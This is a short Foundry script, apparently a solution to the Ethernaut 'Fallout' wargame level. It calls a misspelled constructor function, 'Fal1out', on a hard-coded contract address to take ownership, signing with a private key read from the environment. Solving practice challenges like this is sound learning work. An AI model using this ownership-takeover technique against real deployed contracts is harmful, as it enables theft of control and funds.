// script/FalloutScript.s.sol
pragma solidity ^0.8.0;  // 你自己的文件用0.8.0完全没问题

import "forge-std/Script.sol";

interface IFallout {
    function Fal1out() external payable;  // 注意是数字1
    function owner() external view returns (address);
}

contract FalloutExploit is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        
        IFallout instance = IFallout(0x319bDe9A42F44Bd0eeeF0FF90968d37d09d0Ad8d);

        vm.startBroadcast(privateKey);
        instance.Fal1out();
        vm.stopBroadcast();
    }
}